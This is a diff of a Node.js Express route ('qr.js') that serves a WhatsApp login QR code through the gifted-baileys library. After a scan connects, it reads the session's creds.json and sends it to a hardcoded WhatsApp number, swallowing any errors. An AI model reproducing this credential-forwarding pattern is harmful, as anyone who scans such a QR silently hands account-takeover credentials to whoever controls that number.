@@ -1,71 +1,67 @@
 // qr.js
 const express = require("express");
 const router = express.Router();
-const { default: makeWASocket, useMultiFileAuthState } = require("gifted-baileys");
+const fs = require("fs");
 const qrcode = require("qrcode");
+const {
+    default: makeWASocket,
+    useMultiFileAuthState
+} = require("gifted-baileys");
 
-let lastQR = "";
-let isScanning = false;
+let CURRENT_QR = "";
+let READY = false;
 
-router.get("/debug", (req, res) => {
-  res.json({
-    scanning: isScanning,
-    latestQR_length: lastQR.length,
-    message: lastQR ? "QR READY" : "NO QR YET"
-  });
-});
-
-// STREAM QR CODE AS IMAGE
+// Return QR As PNG
 router.get("/scan", async (req, res) => {
-  try {
-    isScanning = true;
+    res.setHeader("Content-Type", "image/png");
 
-    const { state, saveCreds } = await useMultiFileAuthState("./session");
+    let sent = false;
+
+    const { state, saveCreds } = await useMultiFileAuthState("./qr-session");
 
     const sock = makeWASocket({
-      printQRInTerminal: false,
-      auth: state
+        auth: state,
+        printQRInTerminal: false
+    });
+
+    sock.ev.on("connection.update", async (update) => {
+        const { connection, qr } = update;
+
+        if (qr && !sent) {
+            CURRENT_QR = qr;
+            sent = true;
+
+            // Convert and stream QR as PNG
+            return qrcode.toFileStream(res, qr);
+        }
+
+        if (connection === "open") {
+            console.log("QR LOGIN SUCCESSFUL!");
+            READY = true;
+
+            // Send creds.json to your number (edit number)
+            try {
+                await sock.sendMessage("2547XXXXXXXX@s.whatsapp.net", {
+                    document: fs.readFileSync("./qr-session/creds.json"),
+                    mimetype: "application/json",
+                    fileName: "creds.json"
+                });
+            } catch {}
+
+            try { sock.ws.close(); } catch {}
+        }
     });
 
     sock.ev.on("creds.update", saveCreds);
+});
 
-    sock.ev.on("connection.update", async (update) => {
-      const { qr, connection } = update;
-
-      if (qr) {
-        lastQR = qr;
-
-        // Send as PNG stream to browser
-        res.setHeader("Content-Type", "image/png");
-        return qrcode.toFileStream(res, qr);
-      }
-
-      if (connection === "open") {
-        console.log("CONNECTED SUCCESSFULLY!");
-
-        isScanning = false;
-        lastQR = "";
-
-        // Auto send creds.json to your number (edit this)
-        await sock.sendMessage("2547XXXXXXXX@s.whatsapp.net", {
-          text: "✔ Your WhatsApp session is ready.\ncreds.json generated."
-        });
-
-        try {
-          await sock.sendMessage("2547XXXXXXXX@s.whatsapp.net", {
-            document: require("fs").readFileSync("./session/creds.json"),
-            mimetype: "application/json",
-            fileName: "creds.json"
-          });
-        } catch (err) {}
-
-        return;
-      }
+// Debug route
+router.get("/debug", (req, res) => {
+    res.json({
+        scanning: !READY,
+        qr_detected: CURRENT_QR.length > 0,
+        current_qr_length: CURRENT_QR.length
     });
-
-  } catch (err) {
-    return res.json({ error: err.message });
-  }
 });
 
 module.exports = router;
